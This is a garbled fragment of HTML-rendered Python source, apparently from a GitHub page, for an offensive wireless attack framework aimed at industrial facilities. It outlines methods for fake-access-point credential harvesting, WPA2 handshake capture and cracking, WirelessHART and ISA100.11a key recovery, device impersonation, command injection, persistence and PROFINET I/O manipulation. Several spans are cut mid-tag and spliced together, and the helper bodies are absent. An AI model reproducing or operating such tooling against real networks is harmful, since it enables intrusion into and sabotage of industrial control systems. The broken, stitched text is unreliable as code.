class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eattack_wep\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"pl-s\"\u003e'status'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'UNSUPPORTED_SECURITY'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'protocol'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'security'\u003c/span\u003e]}\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eattack_wpa2_enterprise\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute WPA2-Enterprise attacks targeting RADIUS authentication and certificates.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes EAP method exploitation and credential harvesting techniques.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'eap_method_analysis'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_eap_methods\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e),\n            \u003cspan class=\"pl-c1\"\u003eidentify_radius_servers\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'certificate_manipulation'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eattempt_certificate_bypass\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'credential_harvesting'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esetup_fake_access_point\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eattack_wpa2_psk\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute WPA2-PSK attacks including handshake capture and offline cracking.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Supports dictionary, brute force, and advanced cryptographic attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Capture WPA2 handshake for offline processing\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ehandshake_captured\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecapture_wpa_handshake\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehandshake_captured\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Attempt key recovery using multiple methods\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ekey_recovery_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'dictionary_attack'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexecute_dictionary_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e),\n                \u003cspan class=\"pl-s\"\u003e'brute_force_attack'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexecute_brute_force_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e),\n                \u003cspan class=\"pl-s\"\u003e'rainbow_table_attack'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexecute_rainbow_table_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ewifi_network\u003c/span\u003e)\n            }\n            \n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'handshake_captured'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'key_recovery_attempts'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ekey_recovery_results\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'network_access'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003eany\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ekey_recovery_results\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003evalues\u003c/span\u003e())\n            }\n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"pl-s\"\u003e'handshake_captured'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'status'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'HANDSHAKE_CAPTURE_FAILED'\u003c/span\u003e}\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexploit_wireless_hart\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute comprehensive WirelessHART network exploitation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes eavesdropping, key recovery, network joining, and command injection.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Phase 1: Network eavesdropping and traffic analysis\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ecaptured_packets\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eeavesdrop_wireless_hart\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 2: Cryptographic key recovery attempts\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003enetwork_key\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecrack_wireless_hart_key\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ecaptured_packets\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enetwork_key\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Phase 3: Network infiltration as legitimate device\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ejoin_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ejoin_wireless_hart_network\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork_key\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# Phase 4: Malicious command injection\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ejoin_success\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einject_wireless_hart_commands\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n                \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'network_joined'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'key_recovered'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'command_injection'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'persistent_access'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestablish_persistence\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n                }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'network_joined'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'key_recovered'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebool\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork_key\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'command_injection'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n class=\"pl-s1\"\u003enetwork\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute ISA100.11a wireless network exploitation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Focuses on mesh networking vulnerabilities and routing protocol attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Analyze ISA100 network topology and device relationships\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan vulnerabilities\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003erouting_exploit\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eexploit_isa100_routing\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Attempt device impersonation and command injection\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erouting_exploit\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003edevice_impersonation\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eimpersonate_isa100_device\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etopology\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003ecommand_injection\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einject_isa100_commands\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'routing_compromised'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'device_impersonation'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edevice_impersonation\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'command_injection'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ecommand_injection\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'network_control'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edevice_impersonation\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eand\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecommand_injection\u003c/span\u003e\n            }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\u003cspan class=\"pl-s\"\u003e'routing_compromised'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'status'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'ROUTING_EXPLOIT_FAILED'\u003c/span\u003e}\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexploit_profinet_wireless\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e):\n        \u003cspan class=\"pl-c1\"\u003emanipulate_profinet_io_data\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enetwork\u003c/span\u003e)\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ediscover_wireless_networks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_facility\u003c/span\u003e):\n class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eclassify_networks\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ediscovered_networks\u003c/span\u003e)\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einitialize_wireless_tools\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan      Supports software-defined radio and commercial wireless adapters.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etools\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'sdr_platforms'\u003c/span\u003e: [\u003cspan
